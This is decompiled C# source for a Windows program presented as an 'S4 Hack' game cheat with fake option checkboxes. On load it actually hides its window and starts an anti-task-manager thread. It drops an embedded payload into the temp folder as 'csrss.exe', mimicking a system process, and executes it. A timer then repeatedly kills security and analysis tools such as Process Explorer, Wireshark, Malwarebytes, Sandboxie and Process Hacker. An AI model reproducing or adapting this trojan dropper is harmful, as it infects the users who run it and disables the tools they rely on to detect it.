using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using tool.My;
using tool.My.Resources;

namespace tool;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("CheckBox1")]
	private CheckBox _CheckBox1;

	[AccessedThroughProperty("CheckBox2")]
	private CheckBox _CheckBox2;

	[AccessedThroughProperty("CheckBox3")]
	private CheckBox _CheckBox3;

	[AccessedThroughProperty("CheckBox4")]
	private CheckBox _CheckBox4;

	[AccessedThroughProperty("CheckBox5")]
	private CheckBox _CheckBox5;

	[AccessedThroughProperty("CheckBox6")]
	private CheckBox _CheckBox6;

	[AccessedThroughProperty("CheckBox7")]
	private CheckBox _CheckBox7;

	[AccessedThroughProperty("CheckBox8")]
	private CheckBox _CheckBox8;

	[AccessedThroughProperty("CheckBox9")]
	private CheckBox _CheckBox9;

	[AccessedThroughProperty("CheckBox10")]
	private CheckBox _CheckBox10;

	[AccessedThroughProperty("CheckBox11")]
	private CheckBox _CheckBox11;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("Button2")]
	private Button _Button2;

	[AccessedThroughProperty("OpenFileDialog1")]
	private OpenFileDialog _OpenFileDialog1;

	private AntiTaskManager c;

	internal virtual Timer Timer1
	{
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	internal virtual CheckBox CheckBox1
	{
		get
		{
			return _CheckBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_CheckBox1 = value;
		}
	}

	internal virtual CheckBox CheckBox2
	{
		get
		{
			return _CheckBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_CheckBox2 = value;
		}
	}

	internal virtual CheckBox CheckBox3
	{
		get
		{
			return _CheckBox3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_CheckBox3 = value;
		}
	}

	internal virtual CheckBox CheckBox4
	{
		get
		{
			return _CheckBox4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_CheckBox4 = value;
		}
	}

	internal virtual CheckBox CheckBox5
	{
		get
		{
			return _CheckBox5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_CheckBox5 = value;
		}
	}

	internal virtual CheckBox CheckBox6
	{
		get
		{
			return _CheckBox6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_CheckBox6 = value;
		}
	}

	internal virtual CheckBox CheckBox7
	{
		get
		{
			return _CheckBox7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_CheckBox7 = value;
		}
	}

	internal virtual CheckBox CheckBox8
	{
		get
		{
			return _CheckBox8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_CheckBox8 = value;
		}
	}

	internal virtual CheckBox CheckBox9
	{
		get
		{
			return _CheckBox9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_CheckBox9 = value;
		}
	}

	internal virtual CheckBox CheckBox10
	{
		get
		{
			return _CheckBox10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_CheckBox10 = value;
		}
	}

	internal virtual CheckBox CheckBox11
	{
		get
		{
			return _CheckBox11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_CheckBox11 = value;
		}
	}

	internal virtual Label Label1
	{
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual Button Button1
	{
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Button1_Click;
			if (_Button1 != null)
			{
				((Control)_Button1).remove_Click(eventHandler);
			}
			_Button1 = value;
			if (_Button1 != null)
			{
				((Control)_Button1).add_Click(eventHandler);
			}
		}
	}

	internal virtual TextBox TextBox1
	{
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = TextBox1_TextChanged;
			if (_TextBox1 != null)
			{
				((Control)_TextBox1).remove_TextChanged(eventHandler);
			}
			_TextBox1 = value;
			if (_TextBox1 != null)
			{
				((Control)_TextBox1).add_TextChanged(eventHandler);
			}
		}
	}

	internal virtual Button Button2
	{
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Button2_Click;
			if (_Button2 != null)
			{
				((Control)_Button2).remove_Click(eventHandler);
			}
			_Button2 = value;
			if (_Button2 != null)
			{
				((Control)_Button2).add_Click(eventHandler);
			}
		}
	}

	internal virtual OpenFileDialog OpenFileDialog1
	{
		get
		{
			return _OpenFileDialog1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_OpenFileDialog1 = value;
		}
	}

	public Form1()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		c = new AntiTaskManager();
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Expected O, but got Unknown
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Expected O, but got Unknown
		//IL_00ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		//IL_00b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Expected O, but got Unknown
		//IL_00c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cc: Expected O, but got Unknown
		//IL_05ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_05f6: Expected O, but got Unknown
		components = new Container();
		Timer1 = new Timer(components);
		CheckBox1 = new CheckBox();
		CheckBox2 = new CheckBox();
		CheckBox3 = new CheckBox();
		CheckBox4 = new CheckBox();
		CheckBox5 = new CheckBox();
		CheckBox6 = new CheckBox();
		CheckBox7 = new CheckBox();
		CheckBox8 = new CheckBox();
		CheckBox9 = new CheckBox();
		CheckBox10 = new CheckBox();
		CheckBox11 = new CheckBox();
		Label1 = new Label();
		Button1 = new Button();
		TextBox1 = new TextBox();
		Button2 = new Button();
		OpenFileDialog1 = new OpenFileDialog();
		((Control)this).SuspendLayout();
		((ButtonBase)CheckBox1).set_AutoSize(true);
		CheckBox checkBox = CheckBox1;
		Point location = new Point(12, 104);
		((Control)checkBox).set_Location(location);
		((Control)CheckBox1).set_Name("CheckBox1");
		CheckBox checkBox2 = CheckBox1;
		Size size = new Size(66, 17);
		((Control)checkBox2).set_Size(size);
		((Control)CheckBox1).set_TabIndex(0);
		((ButtonBase)CheckBox1).set_Text("Anti Kick");
		((ButtonBase)CheckBox1).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox2).set_AutoSize(true);
		CheckBox checkBox3 = CheckBox2;
		location = new Point(93, 104);
		((Control)checkBox3).set_Location(location);
		((Control)CheckBox2).set_Name("CheckBox2");
		CheckBox checkBox4 = CheckBox2;
		size = new Size(66, 17);
		((Control)checkBox4).set_Size(size);
		((Control)CheckBox2).set_TabIndex(0);
		((ButtonBase)CheckBox2).set_Text("Anti Ban");
		((ButtonBase)CheckBox2).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox3).set_AutoSize(true);
		CheckBox checkBox5 = CheckBox3;
		location = new Point(12, 174);
		((Control)checkBox5).set_Location(location);
		((Control)CheckBox3).set_Name("CheckBox3");
		CheckBox checkBox6 = CheckBox3;
		size = new Size(72, 17);
		((Control)checkBox6).set_Size(size);
		((Control)CheckBox3).set_TabIndex(0);
		((ButtonBase)CheckBox3).set_Text("Multi Dmg");
		((ButtonBase)CheckBox3).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox4).set_AutoSize(true);
		CheckBox checkBox7 = CheckBox4;
		location = new Point(12, 127);
		((Control)checkBox7).set_Location(location);
		((Control)CheckBox4).set_Name("CheckBox4");
		CheckBox checkBox8 = CheckBox4;
		size = new Size(58, 17);
		((Control)checkBox8).set_Size(size);
		((Control)CheckBox4).set_TabIndex(0);
		((ButtonBase)CheckBox4).set_Text("Full Ap");
		((ButtonBase)CheckBox4).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox5).set_AutoSize(true);
		CheckBox checkBox9 = CheckBox5;
		location = new Point(12, 151);
		((Control)checkBox9).set_Location(location);
		((Control)CheckBox5).set_Name("CheckBox5");
		CheckBox checkBox10 = CheckBox5;
		size = new Size(75, 17);
		((Control)checkBox10).set_Size(size);
		((Control)CheckBox5).set_TabIndex(0);
		((ButtonBase)CheckBox5).set_Text("Full Speed");
		((ButtonBase)CheckBox5).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox6).set_AutoSize(true);
		CheckBox checkBox11 = CheckBox6;
		location = new Point(93, 127);
		((Control)checkBox11).set_Location(location);
		((Control)CheckBox6).set_Name("CheckBox6");
		CheckBox checkBox12 = CheckBox6;
		size = new Size(63, 17);
		((Control)checkBox12).set_Size(size);
		((Control)CheckBox6).set_TabIndex(0);
		((ButtonBase)CheckBox6).set_Text("1 Hit Kill");
		((ButtonBase)CheckBox6).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox7).set_AutoSize(true);
		CheckBox checkBox13 = CheckBox7;
		location = new Point(12, 197);
		((Control)checkBox13).set_Location(location);
		((Control)CheckBox7).set_Name("CheckBox7");
		CheckBox checkBox14 = CheckBox7;
		size = new Size(82, 17);
		((Control)checkBox14).set_Size(size);
		((Control)CheckBox7).set_TabIndex(0);
		((ButtonBase)CheckBox7).set_Text("Add 500 HP");
		((ButtonBase)CheckBox7).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox8).set_AutoSize(true);
		CheckBox checkBox15 = CheckBox8;
		location = new Point(93, 151);
		((Control)checkBox15).set_Location(location);
		((Control)CheckBox8).set_Name("CheckBox8");
		CheckBox checkBox16 = CheckBox8;
		size = new Size(69, 17);
		((Control)checkBox16).set_Size(size);
		((Control)CheckBox8).set_TabIndex(0);
		((ButtonBase)CheckBox8).set_Text("Join Fast");
		((ButtonBase)CheckBox8).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox9).set_AutoSize(true);
		CheckBox checkBox17 = CheckBox9;
		location = new Point(93, 174);
		((Control)checkBox17).set_Location(location);
		((Control)CheckBox9).set_Name("CheckBox9");
		CheckBox checkBox18 = CheckBox9;
		size = new Size(69, 17);
		((Control)checkBox18).set_Size(size);
		((Control)CheckBox9).set_TabIndex(0);
		((ButtonBase)CheckBox9).set_Text("Join Fast");
		((ButtonBase)CheckBox9).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox10).set_AutoSize(true);
		CheckBox checkBox19 = CheckBox10;
		location = new Point(92, 197);
		((Control)checkBox19).set_Location(location);
		((Control)CheckBox10).set_Name("CheckBox10");
		CheckBox checkBox20 = CheckBox10;
		size = new Size(67, 17);
		((Control)checkBox20).set_Size(size);
		((Control)CheckBox10).set_TabIndex(0);
		((ButtonBase)CheckBox10).set_Text("Gun 1Hit");
		((ButtonBase)CheckBox10).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox11).set_AutoSize(true);
		CheckBox checkBox21 = CheckBox11;
		location = new Point(165, 104);
		((Control)checkBox21).set_Location(location);
		((Control)CheckBox11).set_Name("CheckBox11");
		CheckBox checkBox22 = CheckBox11;
		size = new Size(83, 17);
		((Control)checkBox22).set_Size(size);
		((Control)CheckBox11).set_TabIndex(0);
		((ButtonBase)CheckBox11).set_Text("Dagger 1Hit");
		((ButtonBase)CheckBox11).set_UseVisualStyleBackColor(true);
		Label1.set_AutoSize(true);
		((Control)Label1).set_Font(new Font("Tahoma", 36f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label = Label1;
		location = new Point(95, 9);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		size = new Size(212, 58);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(1);
		Label1.set_Text("S4 Hack!");
		Button button = Button1;
		location = new Point(187, 167);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		size = new Size(64, 24);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(2);
		((ButtonBase)Button1).set_Text("browser ");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		((TextBoxBase)TextBox1).set_BorderStyle((BorderStyle)0);
		TextBox textBox = TextBox1;
		location = new Point(257, 167);
		((Control)textBox).set_Location(location);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox2 = TextBox1;
		size = new Size(141, 13);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(3);
		Button button3 = Button2;
		location = new Point(308, 193);
		((Control)button3).set_Location(location);
		((Control)Button2).set_Name("Button2");
		Button button4 = Button2;
		size = new Size(90, 22);
		((Control)button4).set_Size(size);
		((Control)Button2).set_TabIndex(4);
		((ButtonBase)Button2).set_Text("Start");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(true);
		((FileDialog)OpenFileDialog1).set_FileName("S4");
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(SystemColors.Window);
		((Control)this).set_CausesValidation(false);
		size = new Size(400, 222);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)Button2);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)CheckBox5);
		((Control)this).get_Controls().Add((Control)(object)CheckBox4);
		((Control)this).get_Controls().Add((Control)(object)CheckBox3);
		((Control)this).get_Controls().Add((Control)(object)CheckBox11);
		((Control)this).get_Controls().Add((Control)(object)CheckBox10);
		((Control)this).get_Controls().Add((Control)(object)CheckBox9);
		((Control)this).get_Controls().Add((Control)(object)CheckBox8);
		((Control)this).get_Controls().Add((Control)(object)CheckBox7);
		((Control)this).get_Controls().Add((Control)(object)CheckBox6);
		((Control)this).get_Controls().Add((Control)(object)CheckBox2);
		((Control)this).get_Controls().Add((Control)(object)CheckBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)2);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("s4 Hacking");
		((Form)this).set_TransparencyKey(Color.Red);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		ProjectData.EndApp();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		int try0000_dispatch = -1;
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		string text = default(string);
		Thread thread = default(Thread);
		string temp = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					num = 1;
					((Control)this).Hide();
					goto IL_0009;
				case 222:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0012;
						case 4:
							goto IL_002d;
						case 5:
							goto IL_0036;
						case 6:
							goto IL_003f;
						case 7:
							goto IL_0047;
						case 8:
							goto IL_005f;
						case 9:
							goto IL_006e;
						case 10:
							goto IL_007d;
						case 11:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 12:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_007d:
					num = 10;
					Process.Start(text);
					break;
					IL_0009:
					num = 2;
					Control.set_CheckForIllegalCrossThreadCalls(false);
					goto IL_0012;
					IL_0012:
					num = 3;
					thread = new Thread(c.protect);
					goto IL_002d;
					IL_002d:
					num = 4;
					thread.Start();
					goto IL_0036;
					IL_0036:
					num = 5;
					((Control)this).Hide();
					goto IL_003f;
					IL_003f:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0047;
					IL_0047:
					num = 7;
					temp = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp();
					goto IL_005f;
					IL_005f:
					num = 8;
					text = temp + "csrss.exe";
					goto IL_006e;
					IL_006e:
					num = 9;
					File.WriteAllBytes(text, Resources.csrss);
					goto IL_007d;
					end_IL_0000_2:
					break;
				}
				num = 11;
				Timer1.Start();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 222;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		Process process = default(Process);
		int num5 = default(int);
		Process[] processesByName = default(Process[]);
		Process[] array = default(Process[]);
		int num6 = default(int);
		Process process2 = default(Process);
		Process[] processesByName2 = default(Process[]);
		Process[] array2 = default(Process[]);
		int num7 = default(int);
		Process process3 = default(Process);
		Process[] processesByName3 = default(Process[]);
		Process[] array3 = default(Process[]);
		int num8 = default(int);
		Process process4 = default(Process);
		Process[] processesByName4 = default(Process[]);
		Process[] array4 = default(Process[]);
		Process[] processesByName5 = default(Process[]);
		Process[] array5 = default(Process[]);
		int num9 = default(int);
		Process process5 = default(Process);
		Process[] processesByName6 = default(Process[]);
		Process[] array6 = default(Process[]);
		int num10 = default(int);
		Process process6 = default(Process);
		Process[] processesByName7 = default(Process[]);
		Process[] array7 = default(Process[]);
		int num11 = default(int);
		Process process7 = default(Process);
		Process[] processesByName8 = default(Process[]);
		Process[] array8 = default(Process[]);
		int num12 = default(int);
		Process process8 = default(Process);
		Process[] processesByName9 = default(Process[]);
		Process[] array9 = default(Process[]);
		int num13 = default(int);
		Process process9 = default(Process);
		Process[] processesByName10 = default(Process[]);
		Process[] array10 = default(Process[]);
		int num14 = default(int);
		Process process10 = default(Process);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					switch (try0000_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0008;
					case 834:
						{
							num2 = num;
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
							int num4 = unchecked(num2 + 1);
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0008;
							case 3:
								goto IL_0016;
							case 4:
								goto IL_0028;
							case 5:
								goto IL_0038;
							case 6:
								goto IL_0043;
							case 7:
								goto IL_0051;
							case 8:
								goto IL_0063;
							case 9:
								goto IL_0073;
							case 10:
								goto IL_007f;
							case 11:
								goto IL_008f;
							case 12:
								goto IL_00a3;
							case 13:
								goto IL_00b4;
							case 14:
								goto IL_00c0;
							case 15:
								goto IL_00d0;
							case 16:
								goto IL_00e4;
							case 17:
								goto IL_00f5;
							case 18:
								goto IL_0101;
							case 19:
								goto IL_0111;
							case 20:
								goto IL_0125;
							case 21:
								goto IL_0136;
							case 22:
								goto IL_0142;
							case 23:
								goto IL_0151;
							case 24:
								goto IL_0164;
							case 25:
								goto IL_0175;
							case 26:
								goto IL_0181;
							case 27:
								goto IL_0190;
							case 28:
								goto IL_01a3;
							case 29:
								goto IL_01b4;
							case 30:
								goto IL_01c0;
							case 31:
								goto IL_01d0;
							case 32:
								goto IL_01e4;
							case 33:
								goto IL_01f5;
							case 34:
								goto IL_0201;
							case 35:
								goto IL_0211;
							case 36:
								goto IL_0225;
							case 37:
								goto IL_0236;
							case 38:
								goto IL_0242;
							case 39:
								goto IL_0252;
							case 40:
								goto IL_0266;
							case 41:
								goto IL_0277;
							default:
								goto end_IL_0000;
							case 42:
								goto end_IL_0000_2;
							}
							goto default;
						}
						IL_00e4:
						num = 16;
						process.Kill();
						num5++;
						goto IL_00f5;
						IL_0008:
						num = 2;
						processesByName = Process.GetProcessesByName("procexp");
						goto IL_0016;
						IL_0016:
						num = 3;
						array = processesByName;
						num6 = 0;
						goto IL_003b;
						IL_003b:
						if (num6 < array.Length)
						{
							process2 = array[num6];
							goto IL_0028;
						}
						goto IL_0043;
						IL_0043:
						num = 6;
						processesByName2 = Process.GetProcessesByName("SbieCtrl");
						goto IL_0051;
						IL_0051:
						num = 7;
						array2 = processesByName2;
						num7 = 0;
						goto IL_0077;
						IL_0077:
						if (num7 < array2.Length)
						{
							process3 = array2[num7];
							goto IL_0063;
						}
						goto IL_007f;
						IL_007f:
						num = 10;
						processesByName3 = Process.GetProcessesByName("SpyTheSpy");
						goto IL_008f;
						IL_008f:
						num = 11;
						array3 = processesByName3;
						num8 = 0;
						goto IL_00b8;
						IL_00b8:
						if (num8 < array3.Length)
						{
							process4 = array3[num8];
							goto IL_00a3;
						}
						goto IL_00c0;
						IL_00c0:
						num = 14;
						processesByName4 = Process.GetProcessesByName("SpeedGear");
						goto IL_00d0;
						IL_00d0:
						num = 15;
						array4 = processesByName4;
						num5 = 0;
						goto IL_00f9;
						IL_00f9:
						if (num5 < array4.Length)
						{
							process = array4[num5];
							goto IL_00e4;
						}
						goto IL_0101;
						IL_0101:
						num = 18;
						processesByName5 = Process.GetProcessesByName("wireshark");
						goto IL_0111;
						IL_0111:
						num = 19;
						array5 = processesByName5;
						num9 = 0;
						goto IL_013a;
						IL_013a:
						if (num9 < array5.Length)
						{
							process5 = array5[num9];
							goto IL_0125;
						}
						goto IL_0142;
						IL_0142:
						num = 22;
						processesByName6 = Process.GetProcessesByName("mbam");
						goto IL_0151;
						IL_0151:
						num = 23;
						array6 = processesByName6;
						num10 = 0;
						goto IL_0179;
						IL_0179:
						if (num10 < array6.Length)
						{
							process6 = array6[num10];
							goto IL_0164;
						}
						goto IL_0181;
						IL_0181:
						num = 26;
						processesByName7 = Process.GetProcessesByName("apateDNS");
						goto IL_0190;
						IL_0190:
						num = 27;
						array7 = processesByName7;
						num11 = 0;
						goto IL_01b8;
						IL_01b8:
						if (num11 < array7.Length)
						{
							process7 = array7[num11];
							goto IL_01a3;
						}
						goto IL_01c0;
						IL_01c0:
						num = 30;
						processesByName8 = Process.GetProcessesByName("IPBlocker");
						goto IL_01d0;
						IL_01d0:
						num = 31;
						array8 = processesByName8;
						num12 = 0;
						goto IL_01f9;
						IL_01f9:
						if (num12 < array8.Length)
						{
							process8 = array8[num12];
							goto IL_01e4;
						}
						goto IL_0201;
						IL_0201:
						num = 34;
						processesByName9 = Process.GetProcessesByName("cports");
						goto IL_0211;
						IL_0211:
						num = 35;
						array9 = processesByName9;
						num13 = 0;
						goto IL_023a;
						IL_023a:
						if (num13 < array9.Length)
						{
							process9 = array9[num13];
							goto IL_0225;
						}
						goto IL_0242;
						IL_0242:
						num = 38;
						processesByName10 = Process.GetProcessesByName("ProcessHacker");
						goto IL_0252;
						IL_0252:
						num = 39;
						array10 = processesByName10;
						num14 = 0;
						goto IL_027b;
						IL_027b:
						if (num14 < array10.Length)
						{
							process10 = array10[num14];
							goto IL_0266;
						}
						goto end_IL_0000_2;
						IL_0038:
						num = 5;
						goto IL_003b;
						IL_0266:
						num = 40;
						process10.Kill();
						num14++;
						goto IL_0277;
						IL_0277:
						num = 41;
						goto IL_027b;
						IL_0028:
						num = 4;
						process2.Kill();
						num6++;
						goto IL_0038;
						IL_0225:
						num = 36;
						process9.Kill();
						num13++;
						goto IL_0236;
						IL_0236:
						num = 37;
						goto IL_023a;
						IL_00f5:
						num = 17;
						goto IL_00f9;
						IL_01e4:
						num = 32;
						process8.Kill();
						num12++;
						goto IL_01f5;
						IL_01f5:
						num = 33;
						goto IL_01f9;
						IL_0073:
						num = 9;
						goto IL_0077;
						IL_01a3:
						num = 28;
						process7.Kill();
						num11++;
						goto IL_01b4;
						IL_01b4:
						num = 29;
						goto IL_01b8;
						IL_0063:
						num = 8;
						process3.Kill();
						num7++;
						goto IL_0073;
						IL_0164:
						num = 24;
						process6.Kill();
						num10++;
						goto IL_0175;
						IL_0175:
						num = 25;
						goto IL_0179;
						IL_00a3:
						num = 12;
						process4.Kill();
						num8++;
						goto IL_00b4;
						IL_0125:
						num = 20;
						process5.Kill();
						num9++;
						goto IL_0136;
						IL_0136:
						num = 21;
						goto IL_013a;
						IL_00b4:
						num = 13;
						goto IL_00b8;
						end_IL_0000:
						break;
					}
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 834;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		((CommonDialog)OpenFileDialog1).ShowDialog();
		TextBox1.set_Text(((FileDialog)OpenFileDialog1).get_FileName());
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		Process.Start(((FileDialog)OpenFileDialog1).get_FileName());
	}

	private void TextBox1_TextChanged(object sender, EventArgs e)
	{
		((Control)TextBox1).Show();
	}
}
